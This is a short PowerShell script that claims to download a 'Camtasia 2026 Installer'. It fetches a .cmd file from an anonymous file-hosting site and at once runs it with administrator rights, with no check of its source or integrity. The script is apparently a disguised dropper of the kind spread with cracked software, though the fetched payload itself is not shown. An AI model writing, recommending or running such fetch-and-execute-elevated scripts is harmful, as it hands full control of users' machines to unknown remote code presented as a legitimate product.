#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
Write-Host "Downloading Camtasia 2026 Installer, Please Wait..." -ForegroundColor Cyan
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
$Url = "https://file.garden/an5JdIrGtwwEoiH6/Camtasia_2026_Installer.cmd"
$TargetDir = "$env:USERPROFILE\Downloads\Amer"
$Dest = "$TargetDir\Camtasia_2026_Installer.cmd"

if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
irm -Uri $Url -OutFile $Dest
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│
if (Test-Path $Dest) {
    Write-Host "Downloaded Successfully." -ForegroundColor Green
    Write-Host "Saved To: $Dest" -ForegroundColor DarkYellow
    Start-Process -FilePath $Dest -WorkingDirectory $TargetDir -Verb RunAs
} else {
    Write-Host "Download Failed! Check connection." -ForegroundColor Red
}
#═════════════════════════════════════════════════════════════════════════════════════════════════════════════════│